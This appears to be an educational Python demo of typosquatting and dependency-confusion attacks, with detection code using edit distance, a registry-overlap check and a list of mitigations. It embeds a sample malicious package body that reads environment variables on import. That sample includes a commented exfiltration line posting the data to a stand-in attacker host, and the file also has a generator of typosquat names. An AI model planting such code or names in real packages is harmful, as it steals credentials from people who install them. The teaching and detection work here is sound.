"""
Supply Chain Attack — Typosquatting & Dependency Confusion Demo
===============================================================
Illustrates how attackers exploit package naming to distribute malicious code.

Two main techniques:
1. Typosquatting: register packages with names similar to popular packages
2. Dependency confusion: register public packages with same names as private internal packages

Educational use only.
"""

import re


# ---------------------------------------------------------------------------
# Common typosquatting patterns
# ---------------------------------------------------------------------------

def generate_typosquats(package_name: str) -> list:
    """
    Generate common typosquatting variants of a package name.
    These are the names an attacker would register on PyPI.
    """
    variants = set()
    n = package_name

    # 1. Character omission (drop one character)
    for i in range(len(n)):
        variants.add(n[:i] + n[i+1:])

    # 2. Character substitution (common keyboard neighbors)
    keyboard_neighbors = {
        'q': ['w', 'a'], 'w': ['q', 'e', 's'], 'e': ['w', 'r', 'd'],
        'r': ['e', 't', 'f'], 't': ['r', 'y', 'g'], 'y': ['t', 'u', 'h'],
        'u': ['y', 'i', 'j'], 'i': ['u', 'o', 'k'], 'o': ['i', 'p', 'l'],
        's': ['a', 'd', 'w'], 'n': ['m', 'b'], 'm': ['n', ','],
    }
    for i, char in enumerate(n.lower()):
        if char in keyboard_neighbors:
            for neighbor in keyboard_neighbors[char]:
                variants.add(n[:i] + neighbor + n[i+1:])

    # 3. Character transposition (swap adjacent characters)
    for i in range(len(n) - 1):
        variants.add(n[:i] + n[i+1] + n[i] + n[i+2:])

    # 4. Character insertion (common additions)
    for i in range(len(n) + 1):
        for extra in ['s', 'py', '-py', '-python']:
            variants.add(n[:i] + extra + n[i:])

    # 5. Separator changes
    variants.add(n.replace('-', '_'))
    variants.add(n.replace('_', '-'))
    variants.add(n.replace('-', ''))

    # Remove the original
    variants.discard(n)
    # Remove empty
    variants.discard('')

    return sorted(variants)


# ---------------------------------------------------------------------------
# Dependency confusion vulnerability check
# ---------------------------------------------------------------------------

# Simulated internal package registry (private packages)
PRIVATE_PACKAGES = {
    "acme-auth",
    "acme-database",
    "acme-internal-utils",
    "company-config",
    "internal-ml-pipeline",
}

# Simulated public PyPI packages
PUBLIC_PYPI_PACKAGES = {
    "requests", "numpy", "pandas", "transformers", "torch",
    "scikit-learn", "flask", "django", "fastapi", "pydantic",
    # Attacker has registered public versions of private packages:
    "acme-auth",          # ← Dependency confusion attack!
    "company-config",     # ← Dependency confusion attack!
}


def check_dependency_confusion(private_registry: set, public_registry: set) -> list:
    """
    Detect packages that exist in both private and public registries.
    This is a dependency confusion vulnerability.

    An attacker publishes a higher-versioned package with the same name
    as the internal package; pip may prefer the public version.
    """
    vulnerable = []
    for pkg in private_registry:
        if pkg in public_registry:
            vulnerable.append({
                "package": pkg,
                "risk": "HIGH",
                "description": (
                    f"Package '{pkg}' exists in both private and public registry. "
                    f"An attacker may have published a malicious public version with a "
                    f"higher version number. Pip may install the public (malicious) version."
                )
            })
    return vulnerable


# ---------------------------------------------------------------------------
# Malicious package simulation
# ---------------------------------------------------------------------------

MALICIOUS_PACKAGE_CODE = '''
# This is what a malicious package installs in setup.py or __init__.py

import subprocess
import os
import socket

def _exfiltrate():
    """Runs silently on import — steals environment variables and API keys."""
    try:
        # Collect sensitive data
        env_data = str(os.environ)
        
        # Attempt to send to C2 server (blocked in this demo)
        # In real attack: requests.post("http://attacker.com/steal", data=env_data)
        print("[DEMO] Malicious package installed! Would exfiltrate:", list(os.environ.keys())[:5])
    except Exception:
        pass  # Fail silently

_exfiltrate()  # Runs on import
'''


# ---------------------------------------------------------------------------
# Detection and prevention
# ---------------------------------------------------------------------------

def scan_requirements_for_typosquats(requirements: list,
                                      known_good: list) -> list:
    """
    Scan a requirements.txt for potential typosquatting attacks.
    Warns about packages with names similar to popular packages.
    """
    warnings = []
    for req_pkg in requirements:
        req_clean = re.sub(r'[>=<!].*', '', req_pkg).strip().lower()
        for good_pkg in known_good:
            if req_clean == good_pkg:
                continue  # Exact match — this is fine
            # Check edit distance
            if _edit_distance(req_clean, good_pkg) <= 2 and req_clean != good_pkg:
                warnings.append({
                    "package": req_clean,
                    "similar_to": good_pkg,
                    "edit_distance": _edit_distance(req_clean, good_pkg),
                    "risk": "MEDIUM",
                })
    return warnings


def _edit_distance(a: str, b: str) -> int:
    """Levenshtein edit distance."""
    if len(a) < len(b):
        return _edit_distance(b, a)
    if len(b) == 0:
        return len(a)
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a):
        curr = [i + 1]
        for j, cb in enumerate(b):
            curr.append(min(prev[j + 1] + 1, curr[j] + 1,
                            prev[j] + (0 if ca == cb else 1)))
        prev = curr
    return prev[-1]


# ---------------------------------------------------------------------------
# Demo
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    print("Typosquatting & Dependency Confusion Demo")
    print("=" * 60)

    # Typosquatting examples
    popular_packages = ["transformers", "numpy", "requests"]
    for pkg in popular_packages:
        typosquats = generate_typosquats(pkg)[:8]  # Show top 8
        print(f"\n[Typosquats of '{pkg}'] ({len(generate_typosquats(pkg))} total):")
        for ts in typosquats:
            print(f"  pip install {ts}  ← potential attack")

    # Dependency confusion check
    print("\n" + "=" * 60)
    print("Dependency Confusion Vulnerability Scan")
    print("=" * 60)
    vulns = check_dependency_confusion(PRIVATE_PACKAGES, PUBLIC_PYPI_PACKAGES)
    for v in vulns:
        print(f"\n[{v['risk']}] {v['package']}")
        print(f"  {v['description']}")

    # Scan a sample requirements.txt
    print("\n" + "=" * 60)
    print("Requirements.txt Typosquatting Scan")
    print("=" * 60)
    sample_requirements = [
        "requests==2.31.0",
        "transfomers==4.35.0",   # Typosquat: missing 'r'
        "numpy==1.24.0",
        "numpyy==1.24.0",        # Typosquat: extra 'y'
        "torch==2.1.0",
        "toch==2.1.0",           # Typosquat
    ]
    warnings = scan_requirements_for_typosquats(
        sample_requirements,
        ["requests", "transformers", "numpy", "torch", "pandas"]
    )
    for w in warnings:
        print(f"\n[{w['risk']}] '{w['package']}' may be a typosquat of '{w['similar_to']}'")
        print(f"  Edit distance: {w['edit_distance']}")

    print("\n[Mitigations]")
    print("1. Pin exact versions in requirements.txt")
    print("2. Use a private package mirror (Artifactory, Nexus, AWS CodeArtifact)")
    print("3. Verify package hashes: pip install --require-hashes -r requirements.txt")
    print("4. Run pip-audit or safety check in CI/CD")
    print("5. Scan for typosquats before adding new dependencies")
